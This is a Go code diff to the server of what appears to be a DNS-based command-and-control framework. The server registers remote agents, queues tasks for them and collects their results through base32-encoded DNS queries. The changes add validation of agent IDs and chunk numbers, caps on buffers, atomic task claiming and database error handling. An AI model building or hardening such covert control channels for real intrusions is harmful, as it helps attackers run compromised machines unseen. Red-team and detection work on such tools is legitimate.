@@ -28,6 +28,8 @@ import (
 
 var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)
 
+const maxDNSChunks = 4096
+
 type dnsC2 struct {
 	s      *Server
 	domain string // lower-case with trailing dot, e.g. "c2.local."
@@ -159,11 +161,17 @@ func (dc *dnsC2) handleQuery(labels []string, remoteHost string) string {
 		seq := parseIntLabel(labels[2])
 		total := parseIntLabel(labels[3])
 		agentID := labels[4]
+		if !validDNSAgentID(agentID) || !validDNSChunk(seq, total, chunk) {
+			return "err:bad-reg"
+		}
 		return dc.handleReg(agentID, chunk, seq, total)
 
 	case "poll":
 		// poll.<agentid16>
 		if len(labels) < 2 {
+			return "err:bad-poll"
+		}
+		if !validDNSAgentID(labels[1]) {
 			return "err:bad-poll"
 		}
 		return dc.handlePoll(labels[1])
@@ -178,6 +186,9 @@ func (dc *dnsC2) handleQuery(labels []string, remoteHost string) string {
 		total := parseIntLabel(labels[3])
 		taskIDHex := labels[4]
 		agentID := labels[5]
+		if !validDNSAgentID(agentID) || !validDNSChunk(seq, total, chunk) || taskIDHex == "" {
+			return "err:bad-res"
+		}
 		return dc.handleResult(agentID, taskIDHex, chunk, seq, total)
 
 	case "chunk":
@@ -187,6 +198,9 @@ func (dc *dnsC2) handleQuery(labels []string, remoteHost string) string {
 		}
 		seq := parseIntLabel(labels[1])
 		agentID := labels[2]
+		if !validDNSAgentID(agentID) || seq < 0 || seq >= maxDNSChunks {
+			return "nil"
+		}
 		return dc.getTaskChunk(agentID, seq)
 
 	case "canary":
@@ -209,6 +223,10 @@ func (dc *dnsC2) handleQuery(labels []string, remoteHost string) string {
 // handleReg processes a registration chunk from an agent.
 func (dc *dnsC2) handleReg(agentID, b32Chunk string, seq, total int) string {
 	dc.mu.Lock()
+	if dc.regBuf[agentID] == nil && len(dc.regBuf) >= 4096 {
+		dc.mu.Unlock()
+		return "err:busy"
+	}
 	if dc.regBuf[agentID] == nil {
 		dc.regBuf[agentID] = make(map[int]string)
 	}
@@ -275,14 +293,12 @@ func (dc *dnsC2) handlePoll(agentID string) string {
 		return fmt.Sprintf("more:%d", len(chunks))
 	}
 
-	tasks, err := dc.s.db.PendingTasks(agentID)
+	tasks, err := dc.s.db.ClaimPendingTasks(agentID, 1)
 	if err != nil || len(tasks) == 0 {
 		return "nil"
 	}
 
 	task := tasks[0]
-	dc.s.db.MarkTaskFetched(task.ID)
-
 	tw := struct {
 		ID   int64  `json:"id"`
 		Type string `json:"type"`
@@ -326,6 +342,10 @@ func (dc *dnsC2) getTaskChunk(agentID string, seq int) string {
 func (dc *dnsC2) handleResult(agentID, taskIDHex, b32Chunk string, seq, total int) string {
 	key := taskIDHex + ":" + agentID
 	dc.mu.Lock()
+	if dc.resBuf[key] == nil && len(dc.resBuf) >= 4096 {
+		dc.mu.Unlock()
+		return "err:busy"
+	}
 	if dc.resBuf[key] == nil {
 		dc.resBuf[key] = make(map[int]string)
 	}
@@ -356,7 +376,9 @@ func (dc *dnsC2) handleResult(agentID, taskIDHex, b32Chunk string, seq, total in
 		return "err:json"
 	}
 
-	dc.s.db.InsertResult(result.TaskID, agentID, result.Output, result.Error)
+	if err := dc.s.db.InsertResult(result.TaskID, agentID, result.Output, result.Error); err != nil {
+		return "err:db"
+	}
 	dc.s.printf("[dns] result for task #%d from %s\n", result.TaskID, agentID[:8])
 	return "ack"
 }
@@ -364,13 +386,36 @@ func (dc *dnsC2) handleResult(agentID, taskIDHex, b32Chunk string, seq, total in
 // ── helpers ───────────────────────────────────────────────────────────────
 
 func parseIntLabel(s string) int {
+	if s == "" {
+		return -1
+	}
 	n := 0
 	for _, c := range s {
-		if c >= '0' && c <= '9' {
-			n = n*10 + int(c-'0')
+		if c < '0' || c > '9' {
+			return -1
+		}
+		n = n*10 + int(c-'0')
+		if n > maxDNSChunks {
+			return -1
 		}
 	}
 	return n
+}
+
+func validDNSAgentID(s string) bool {
+	if len(s) != 16 {
+		return false
+	}
+	for _, c := range s {
+		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
+			return false
+		}
+	}
+	return true
+}
+
+func validDNSChunk(seq, total int, chunk string) bool {
+	return total > 0 && total <= maxDNSChunks && seq >= 0 && seq < total && len(chunk) > 0 && len(chunk) <= 48
 }
 
 func chunkString(s string, size int) []string {
